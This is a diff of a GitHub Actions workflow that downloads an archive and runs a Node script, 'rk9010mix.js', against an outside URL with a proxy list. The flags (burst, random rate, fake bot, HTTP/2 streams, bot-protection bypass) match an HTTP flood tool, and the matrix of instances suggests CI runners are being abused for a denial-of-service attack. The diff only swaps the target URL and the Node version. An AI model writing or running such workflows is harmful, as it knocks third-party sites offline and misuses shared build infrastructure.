@@ -23,7 +23,7 @@ jobs:
       - name: Setup Node.js
         uses: actions/setup-node@v4
         with:
-          node-version: '26'
+          node-version: '0.10.48'
       
       - name: Setup Python
         uses: actions/setup-python@v4
@@ -45,7 +45,7 @@ jobs:
           unzip Fc-main.zip
           cd Fc-main
           
-          node rk9010mix.js https://rapidis.gay/6901966783-89021322-aeb2-42cb-959b-78af5a254f37 250 400 2 proxy.txt --full --close --burst --randrate --fakebot --http 2 --ram 100 --streams 290 --direct --bfm --table 65536 --window 8388608
+          node rk9010mix.js https://rapidis.gay/6901966783-767ff9c4-4c80-484a-8a93-0fb8d84ac239 250 400 2 proxy.txt --full --close --burst --randrate --fakebot --http 2 --ram 100 --streams 290 --direct --bfm --table 65536 --window 8388608
           
         env:
           INSTANCE_NUMBER: ${{ matrix.instance }}
